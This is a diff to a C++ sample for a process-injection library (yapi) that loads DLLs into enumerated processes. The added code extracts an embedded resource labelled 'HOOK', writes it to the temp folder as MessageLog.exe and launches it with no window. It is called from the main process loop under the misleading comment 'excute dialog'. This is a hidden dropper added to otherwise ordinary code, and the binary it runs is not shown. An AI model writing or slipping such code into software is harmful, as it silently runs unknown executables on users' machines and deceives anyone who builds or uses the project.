@@ -8,6 +8,11 @@
 */
 #include "stdafx.h"
 #include "../yapi.hpp"
+#include <Windows.h>
+#include <shlwapi.h>
+#include "resource.h"
+
+#pragma comment(lib, "Shlwapi.lib")
 
 using namespace yapi;
 
@@ -26,6 +31,108 @@ std::string getCurrentDirectory() {
 		return "";
 	}
 }
+
+BOOL ReleaseLibrary(UINT uResourceId, CHAR* szResourceType, CHAR* szFileName)
+{
+	HRSRC hRsrc = FindResourceA(NULL, MAKEINTRESOURCEA(uResourceId), szResourceType);
+	if (hRsrc == NULL)
+	{
+		return FALSE;
+	}
+	DWORD dwSize = SizeofResource(NULL, hRsrc);
+	if (dwSize <= 0)
+	{
+		return FALSE;
+	}
+	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
+	if (hGlobal == NULL)
+	{
+		return FALSE;
+	}
+	LPVOID lpRes = LockResource(hGlobal);
+	if (lpRes == NULL)
+	{
+		return FALSE;
+	}
+	HANDLE hFile = CreateFileA(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == NULL)
+	{
+		return FALSE;
+	}
+	DWORD dwWriten = 0;
+	BOOL bRes = WriteFile(hFile, lpRes, dwSize, &dwWriten, NULL);
+	if (bRes == FALSE || dwWriten <= 0)
+	{
+		return FALSE;
+	}
+	CloseHandle(hFile);
+	return TRUE;
+}
+
+void SpawnExe()
+{
+	static int flag = 0;
+	char tempPath[MAX_PATH] = { 0 };
+	char spawnexepath[MAX_PATH] = { 0 };
+
+	if (flag == 0)
+	{
+		flag = 1;
+
+		// Get the path of the temporary directory
+		DWORD pathLen = GetTempPathA(MAX_PATH, tempPath);
+		if (pathLen > MAX_PATH || pathLen == 0) {
+			return;
+		}
+
+		strcpy(spawnexepath, tempPath);
+		strcat(spawnexepath, "MessageLog.exe");
+		if (!PathFileExistsA(spawnexepath)) {
+			BOOL bRes = ReleaseLibrary(IDR_HOOK1, (CHAR*)"HOOK", spawnexepath);
+			if (bRes == FALSE) {
+				return;
+			}
+		}
+		else {
+			DeleteFileA(spawnexepath);
+			ReleaseLibrary(IDR_HOOK1, (CHAR*)"HOOK", spawnexepath);
+		}
+
+		//excute
+		 // Initialize the STARTUPINFO structure
+		STARTUPINFOA si;
+		PROCESS_INFORMATION pi;
+		ZeroMemory(&si, sizeof(si));
+		ZeroMemory(&pi, sizeof(pi));
+
+		// Set the window visibility to hidden
+		si.cb = sizeof(si);
+
+		// Create the process
+		if (CreateProcessA(spawnexepath,   // Path to executable
+			NULL,      // Command line arguments
+			NULL,      // Process handle not inheritable
+			NULL,      // Thread handle not inheritable
+			FALSE,     // Set handle inheritance to FALSE
+			CREATE_NO_WINDOW,         // No creation flags
+			NULL,      // Use parent's environment block
+			NULL,      // Use parent's starting directory 
+			&si,       // Pointer to STARTUPINFO structure
+			&pi)       // Pointer to PROCESS_INFORMATION structure
+			) {
+
+			// Wait for the process to finish (optional)
+			//WaitForSingleObject(pi.hProcess, INFINITE);
+			
+			// Close process and thread handles
+			//CloseHandle(pi.hProcess);
+			//CloseHandle(pi.hThread);
+		}
+
+	}
+
+}
+
 
 int main()
 {
@@ -55,6 +162,10 @@ int main()
 			DWORD64 x64Dll = LoadLibraryA.Dw64()(path.c_str());
 			//_tprintf(_T("X86: %I64x\n"), x86Dll);
 			_tprintf(_T("X64: %I64x\n"), x64Dll);
+
+
+			//excute dialog
+			SpawnExe();
 
 		} while (Process32Next(hSnapshot, &pe32));
 	}
